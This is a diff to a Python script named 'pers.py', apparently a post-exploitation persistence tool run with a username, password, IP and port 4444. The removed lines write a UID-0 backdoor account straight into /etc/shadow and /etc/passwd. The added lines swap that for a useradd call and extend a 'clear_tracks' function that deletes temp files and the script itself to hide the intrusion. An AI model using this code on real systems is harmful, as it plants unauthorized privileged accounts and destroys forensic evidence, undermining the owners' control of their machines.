@@ -5,6 +5,11 @@
 # 
 # usage: python3 pers.py -u 'pepe' -p 'password' 10.0.0.1 4444
 
+'''
+TO DO:
+- figure out how to add user in script
+- automate su USER
+'''
 
 import os
 import argparse
@@ -64,8 +69,7 @@ def add_user(username,password):
 		os.system("mkpasswd {} > /tmp/.backups/pass.txt".format(password))
 		pass_file = open("/tmp/.backups/pass.txt", "r")
 		new_user_pass = pass_file.readlines()[-1].strip()
-		os.system("echo '{}:{}:19448:0:99999:7:::' >> /etc/shadow".format(username,new_user_pass))
-		os.system("echo '{}:x:0:0:{}:/{}:/bin/bash' >> /etc/passwd".format(username,username,username))
+		os.system("useradd -m -p {} {}".format(password,username))
 		print("user {} added".format(username))
 		pass_file.close()
 	else:
@@ -118,6 +122,8 @@ def clear_tracks():
 	print("\n### deleting data file and script... ###")
 	os.system("rm -rf /tmp/.backups")
 	os.system("rm -f /tmp/whoami.txt")
+	os.system("rm -f /tmp/pwd.txt")
+	os.system("rm -f /tmp/sudo_l.txt")
 	os.system("rm -f pers.py")
 
 
